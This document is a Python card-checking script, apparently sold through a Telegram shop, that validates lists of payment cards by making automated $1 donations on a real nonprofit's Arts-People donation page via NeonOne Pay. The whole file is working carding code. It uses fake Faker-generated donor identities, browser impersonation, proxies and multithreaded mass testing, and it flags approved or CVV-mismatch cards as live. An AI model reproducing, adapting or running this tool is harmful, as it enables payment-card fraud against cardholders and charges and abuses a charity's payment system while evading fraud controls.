
#! =====================================================================================
#! [⚠️] README — ARIES PARSER | ARTS-PEOPLE ~ NEONONEPAY DONATION CHECKER
#! =====================================================================================
#*
#* Author: Vxsilisk © Sxgitario Gateway API Service
#* Project: Arts-People — NeonOne Pay Donation Checker
#* Gateway: app.arts-people.com → NeonOne Pay (Payrix processor)
#* Region: US
#* Requirements: pip install faker colorama curl-cffi
#*
#! (MASS) - Usage for mass mode --------------------------
#*
#*   gate = Core(proxy=None)
#*   gate.mass("ccs.txt")  # format: ccnum|mm|yyyy|cvv
#*
#! (SIMPLE) - Usage for simple mode (one card) ----------
#*
#*   gate = Core(card="4111111111111111|01|2030|123", proxy=None)
#*   print(gate.json())
#*   print(gate)
#*
#? -------------------------------------------------------------------------------------
#?  SUPPORT / CONTACT
#? -------------------------------------------------------------------------------------
#* Telegram (SHOP): https://t.me/Sxgitario
#* Telegram (DEV):  https://t.me/Vxsilisk
#*
#? Thank you for using Sxgitario Gateway API Service ✨
#! =====================================================================================

import re, os, random, types
from faker import Faker
from colorama import Fore
from curl_cffi import requests as curl, CurlMime
from concurrent.futures import ThreadPoolExecutor


class Core:

    #TODO: Public Data & Methods - Constants, Initializer, JSON Output, Mass Handler
    SITE_URL       = 'https://app.arts-people.com'
    DONATION_SLUG  = 'txemp'
    NEONPAY_URL    = 'https://app.neononepay.com/api/tokenize'
    NEONPAY_KEY    = 'public_6d69b37a9efba1a9b065e0ec217855e4029d365734d581ea88d00de0'
    NEONPAY_MID    = 7421
    EMAIL_DOMAINS  = ('gmail.com', 'outlook.com', 'hotmail.com')
    TITLE_MESSAGE  = f"\n{Fore.LIGHTGREEN_EX}b.Vxsilisk {Fore.LIGHTWHITE_EX} / {Fore.LIGHTMAGENTA_EX}Atlas v0.5{Fore.LIGHTWHITE_EX} / {Fore.LIGHTCYAN_EX}Sxgitario ~ Api Gateway Services{Fore.LIGHTWHITE_EX}"
    json           = lambda self: self.responseGate
    RESPONSES_MAP  = ['Approved', 'approved', 'Thank you', 'Order Confirmed', 'Transaction failed. Declined: Invalid CVV. AVS check alert: AVS not available. CVV matching alert: Security code does not match', 'Transaction failed. Declined: CVV2 Value Mismatch. AVS check alert: AVS not available. CVV matching alert: Security code does not match']


    def __init__(self, card: str = None, proxy: str = None, test: bool = False) -> None:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.card    = self.__parseCard(card) if card else None
            self.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

            if self.card:
                gate = self.__processBillingFlow()
                None if test else self.__makeResponse(gate)

        except Exception as e:
            self.raise_message = str(e); del self


    def mass(self, file_combo: str = 'ccs.txt') -> None:
        print(self.TITLE_MESSAGE)
        if not os.path.isfile(file_combo):
            self.raise_message = f'File not found: {file_combo}'; del self; return
        with open(file_combo, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        with ThreadPoolExecutor(max_workers=5) as executor:
            list(executor.map(self.__massHandler, cards))


    #TODO: Private Methods - Helper Functions

    def __massHandler(self, card: str) -> None:
        response     = self.__processBillingFlow(cardData=card)
        massResponse = self.__makeResponse(response, mass=True)
        ok    = massResponse.get('apiResponse') == 'Approved ✅'
        color = Fore.LIGHTGREEN_EX if ok else Fore.LIGHTRED_EX
        w     = Fore.LIGHTWHITE_EX
        text  = f"{w}[{Fore.LIGHTCYAN_EX} INFO {w}] {w}Card: {Fore.LIGHTBLUE_EX}{massResponse.get('card')}\n"
        text += f"{w}[{color} INFO {w}] {w}Status: {color}{massResponse.get('apiResponse')}\n"
        text += f"{w}[{color} INFO {w}] {w}Response: {color}{massResponse.get('message')}\n"
        print(text)


    def __parseCard(self, card: str) -> dict:
        number, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', card.strip())[:4]
        year = f'20{year}' if len(year) == 2 else year
        return {'number': number, 'month': month.zfill(2), 'year': year, 'cvv': cvv}


    def __generateFakeProfile(self) -> types.SimpleNamespace:
        fake = Faker('en_US')
        p    = fake.profile()
        fn, ln = p['name'].split()[0], p['name'].split()[-1]
        return types.SimpleNamespace(
            f_name  = fn,  l_name  = ln,
            mail    = f'{fn.lower()}.{ln.lower()}{random.randint(0, 999)}@{random.choice(self.EMAIL_DOMAINS)}',
            address = f'{fake.building_number()} {fake.street_name()}',
            city    = fake.city(),  state   = fake.state_abbr(),
            zipcode = fake.postcode(), phone = fake.numerify('##########'),
        )


    def __buildForm(self, fields: dict) -> CurlMime:
        mp = CurlMime()
        for name, value in fields.items():
            mp.addpart(name=name, data=str(value))
        return mp


    def __makeResponse(self, data: dict, mass: bool = False) -> dict:
        apiResponse = 'Declined ❌'
        for r in self.RESPONSES_MAP:
            if r in data.get('message', ''): apiResponse = 'Approved ✅'; break
        result = {
            'status':      data.get('status'),
            'success':     data.get('success'),
            'message':     data.get('message'),
            'apiResponse': apiResponse,
            'card':        data.get('card'),
            'gateway':     'ArtsPeople ~ NeonOne Pay ~ Payrix',
            'powered-by':  'Sxgitario ~ Api Gateway Services',
        }
        if mass: return result
        self.responseGate = result


    def __str__(self) -> str:
        r     = self.responseGate
        ok    = r.get('apiResponse') == 'Approved ✅'
        color = Fore.LIGHTGREEN_EX if ok else Fore.LIGHTRED_EX
        w     = Fore.LIGHTWHITE_EX
        text  = self.TITLE_MESSAGE + '\n'
        text += f"{w}[{Fore.LIGHTCYAN_EX} INFO {w}] {w}Card: {Fore.LIGHTBLUE_EX}{r.get('card')}\n"
        text += f"{w}[{Fore.LIGHTCYAN_EX} INFO {w}] {w}Gateway: {Fore.LIGHTBLUE_EX}{r.get('gateway')}\n"
        text += f"{w}[{color} INFO {w}] {w}Status: {color}{r.get('apiResponse')}\n"
        text += f"{w}[{color} INFO {w}] {w}Response: {color}{r.get('message')}\n"
        text += f"{w}[{Fore.LIGHTCYAN_EX} INFO {w}] {w}Securities: {Fore.LIGHTRED_EX}NeonOne Pay ~ reCAPTCHA v3\n"
        return text


    def __del__(self) -> None:
        if not hasattr(self, 'raise_message'): return
        print(self.TITLE_MESSAGE + '\n')
        print(f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} ERROR {Fore.LIGHTWHITE_EX}] {Fore.LIGHTRED_EX}Malformed object deleted. {Fore.LIGHTWHITE_EX}({Fore.LIGHTRED_EX} {self.raise_message} {Fore.LIGHTWHITE_EX})")


    def __processBillingFlow(self, cardData: str = None, retries: int = 0) -> dict:
        try:
            card     = self.__parseCard(cardData) if cardData else self.card
            card_str = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
            data     = self.__generateFakeProfile()
            exp_date = f"{card['month']}/{card['year'][2:]}"

            model         = curl.Session(impersonate='chrome131')
            model.proxies = self.proxies

            #//! Request 0 — Init session + APV cookie --------------------------------+
            request0 = model.get(url = f'{self.SITE_URL}/index.php?donation={self.DONATION_SLUG}', timeout = 20)

            #//! Request 1 — Select $1 donation (General Support) --------------------+
            headers1 = {'Referer': f'{self.SITE_URL}/index.php?donation={self.DONATION_SLUG}'}
            payload1 = {'radio_donation_method': 'once', '3': '1', '5': '', '6': '-Please select-', '8': '', '9': '25523', 'HC%10': '', '11': '', '12': '', '13': 'Continue', 'p': '1'}
            request1 = model.post(url = f'{self.SITE_URL}/index.php', multipart = self.__buildForm(payload1), headers = headers1, timeout = 20)

            #//! Request 2 — Guest checkout (skip account creation) ------------------+
            headers2 = {'Referer': f'{self.SITE_URL}/index.php'}
            payload2 = {'3': data.mail, '6': 'Checkout As Guest', 'p': '5'}
            request2 = model.post(url = f'{self.SITE_URL}/index.php', multipart = self.__buildForm(payload2), headers = headers2, timeout = 20)

            #//! Request 3 — Billing step 1: name / address --------------------------+
            headers3 = {'Referer': f'{self.SITE_URL}/index.php'}
            payload3 = {'3': data.f_name, '4': data.l_name, '5': data.address, '6': '', '7': data.city, '8': data.state, '9': data.zipcode, '10': data.phone, '11': '', 'HC%12': '', '13': '', '14': '', '15': '', '16': '', 'HC%17': '', '17': '1', '18': data.mail, '19': '1', '20': 'Save', '22': '', 'p': '3'}
            request3 = model.post(url = f'{self.SITE_URL}/index.php', multipart = self.__buildForm(payload3), headers = headers3, timeout = 20)

            #//! Request 4 — Billing step 2: save & continue → payment page (756) ---+
            headers4 = {'Referer': f'{self.SITE_URL}/index.php'}
            payload4 = {'3': data.f_name, '4': data.l_name, '5': data.address, '6': '', '7': data.city, '8': data.state, '9': data.zipcode, '10': data.phone, '11': '', 'HC%12': '', '13': '', '14': '', '15': '', '16': '', 'HC%17': '', '17': '1', '18': data.mail, '19': '1', '24': '', '28': '', '29': 'Save and Continue', 'p': '4'}
            request4 = model.post(url = f'{self.SITE_URL}/index.php', multipart = self.__buildForm(payload4), headers = headers4, timeout = 20)
            if "currentPage = '756'" not in request4.text:
                return {'status': False, 'success': False, 'message': 'Billing failed — payment page not reached', 'card': card_str}

            #//! Request 5 — NeonPay card tokenization --------------------------------+
            headers5 = {'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': 'https://app.neononepay.com', 'Referer': 'https://app.neononepay.com/token?v=4.0', 'X-Merchant-ID': str(self.NEONPAY_MID)}
            payload5 = {'type': 'cc', 'card_number': card['number'], 'expiration_date': exp_date, 'card_cvc': card['cvv'], 'address_zip': data.zipcode, 'merchant_id': self.NEONPAY_MID, 'public_app_key': self.NEONPAY_KEY, 'reuse': False, 'first_name': data.f_name, 'middle_name': '', 'last_name': data.l_name, 'address_line_1': '', 'address_line_2': '', 'address_city': '', 'address_state': '', 'address_country': '', 'email': '', 'phone': ''}
            request5 = model.post(url = self.NEONPAY_URL, headers = headers5, json = payload5, timeout = 15)
            neo_j  = request5.json()
            np_tok = neo_j.get('token', '')
            np_bin = neo_j.get('bin', card['number'][:6])
            np_num = neo_j.get('number', card['number'][-4:])
            np_typ = neo_j.get('method', 'Visa')
            np_exp = neo_j.get('expiration', exp_date.replace('/', ''))
            np_exp_fmt = f"{np_exp[:2]}/{np_exp[2:]}" if len(np_exp) == 4 else exp_date
            if not np_tok:
                return {'status': False, 'success': False, 'message': f'NeonPay tokenization failed — {request5.status_code}', 'card': card_str}

            #//! Request 6 — Final charge attempt ------------------------------------+
            headers6 = {'Referer': f'{self.SITE_URL}/index.php'}
            payload6 = {'HC%6': '', '10': data.zipcode, '16': '', 'p': '5', '__R': '1', '__RV': '', '14': 'Complete Order', '7': np_tok, 'npt-card-type': np_typ, 'npt-expiration-date': np_exp_fmt, 'npt-last-four': np_num, 'npt-zip': data.zipcode, 'npt-test-transaction': '0', 'npt-is-applepay': '0', 'npt-is-gpay': '0', 'npt-is-paypal': '0', 'npt-is-venmo': '0', 'npt-bin': np_bin, 'npt-first-name': data.f_name, 'npt-last-name': data.l_name}
            request6 = model.post(url = f'{self.SITE_URL}/public/confirm/order/', multipart = self.__buildForm(payload6), headers = headers6, timeout = 25)

            #//! Parse result ---------------------------------------------------------+
            err = re.search(r'<p[^>]*CLASS="error"[^>]*>(.*?)</p>', request6.text, re.DOTALL | re.I)
            if err:
                msg = re.sub(r'<[^>]+>', '', err.group(1)).strip()
                return {'status': True, 'success': False, 'message': msg, 'card': card_str}

            return {'status': True, 'success': True, 'message': 'Approved', 'card': card_str}

        except Exception as error:
            if retries < 2: return self.__processBillingFlow(cardData=cardData, retries=retries + 1)
            return {'status': False, 'success': False, 'message': str(error), 'card': card_str if 'card_str' in dir() else ''}


if __name__ == '__main__':

    gate = Core(
        card = "4111111111111111|01|2030|123",  # Example card: number|month|year|cvv
        proxy = 'user:pass@host:port' 
    )
